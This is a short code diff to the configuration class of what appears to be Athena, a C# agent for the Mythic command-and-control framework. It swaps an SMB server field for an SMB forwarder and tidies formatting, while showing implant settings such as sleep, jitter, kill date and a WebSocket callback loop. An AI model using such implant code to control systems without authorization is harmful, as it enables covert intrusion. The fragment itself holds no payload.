@@ -16,7 +16,7 @@ namespace Athena.Config
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SmbServer smbConfig { get; set; }
+        public SMBForwarder smbForwarder;
 
         public MythicConfig()
         {
@@ -28,7 +28,7 @@ namespace Athena.Config
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
-            this.smbConfig = new SmbServer();
+            this.smbForwarder = new SMBForwarder();
         }
     }
 
@@ -75,12 +75,11 @@ namespace Athena.Config
             {
                 ws = new ClientWebSocket();
                 ws.ConnectAsync(new Uri(url), CancellationToken.None);
-                
+
                 while (ws.State != WebSocketState.Open)
                 {
                     if (this.connectAttempts == 300)
                     {
-                        //Couldn't connect for 5m, probably not going to connect if we got to this point.
                         Environment.Exit(0);
                     }
                     Thread.Sleep(1000);
@@ -143,7 +142,8 @@ namespace Athena.Config
         }
         static async Task<string> Receive(ClientWebSocket socket)
         {
-            try{
+            try
+            {
                 var buffer = new ArraySegment<byte>(new byte[2048]);
                 do
                 {
